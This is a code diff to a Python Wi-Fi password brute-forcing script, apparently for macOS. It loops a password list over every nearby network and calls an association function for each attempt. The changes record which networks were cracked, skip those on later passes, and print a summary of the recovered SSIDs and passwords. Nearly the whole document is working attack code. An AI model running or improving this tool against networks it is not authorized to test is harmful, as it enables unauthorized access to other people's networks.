@@ -48,9 +48,9 @@ if input("Continue? (y/n)") != 'y':
 with open("password-list-short.txt", "r", encoding="utf-8") as f:
     passwords = set([a.strip() for a in f.readlines()])
 
-
 errors = set()
 n_pass = 0
+successful = {}
 
 for password in passwords:
     n_pass += 1
@@ -60,6 +60,8 @@ for password in passwords:
     for network in networks.values():
 
         ssid = network.ssid()
+        if ssid in successful.keys():
+            continue
 
         if n_pass == 1:
             network_passwords = passwords_from_ssid(ssid)
@@ -70,6 +72,11 @@ for password in passwords:
         for p in network_passwords:
             logger.info("Connecting to network '%s' with password '%s'" % (ssid, p))
             success, error = iface.associateToNetwork_password_error_(network, p, None)
+            if success:
+                print("Success >>> Network '%s' password '%s'" % (ssid, p))
+                successful[ssid] = p
+                break               
+ 
             if error:
                 code = error.code()
                 logger.info("Got error: %s" % code)
@@ -83,6 +90,12 @@ for password in passwords:
                 else:
                     errors.add(code)
 
-            else:
-                break
 
+
+if successful:
+    print("Bruteforced networks:")
+    for ssid, password in successful.items():
+        print("Network '%s', password '%s'" % (ssid, password))
+
+else:
+    print("No networks were successfully bruteforced.")
